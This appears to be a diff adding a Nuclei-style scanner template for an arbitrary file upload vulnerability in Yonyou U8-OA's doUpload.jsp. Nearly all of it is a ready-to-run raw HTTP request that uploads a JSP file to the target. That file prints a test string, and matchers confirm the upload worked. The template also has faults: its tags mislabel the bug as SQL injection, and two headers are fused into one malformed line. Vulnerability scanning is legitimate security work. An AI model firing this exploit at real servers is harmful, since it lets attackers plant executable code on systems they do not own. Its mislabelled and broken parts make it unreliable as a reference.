@@ -1,0 +1,40 @@
+id: yongyouOA-doUpload-jsp-file-upload
+
+info:
+  name: 用友U8-OA协同工作系统doUpload.jsp任意文件上传漏洞
+  author: cnaq  
+  severity: high 
+  description: 用友U8-OA协同工作系统doUpload.jsp任意文件上传漏洞
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU8-OA%E5%8D%8F%E5%90%8C%E5%B7%A5%E4%BD%9C%E7%B3%BB%E7%BB%9FdoUpload.jsp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: yongyou,sql,injection 
+
+requests:
+  - raw:
+      - |
+        POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+        Connection: closeContent-Type: multipart/form-data; boundary=7b1db34fff56ef636e9a5cebcd6c9a75
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 217
+
+        --7b1db34fff56ef636e9a5cebcd6c9a75
+        Content-Disposition: form-data; name="iconFile"; filename="info.jsp"
+        Content-Type: application/octet-stream
+
+        <% out.println("tteesstt1"); %>
+        --7b1db34fff56ef636e9a5cebcd6c9a75--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: regex
+        part: body
+        regex:
+          - 'window.returnValue'
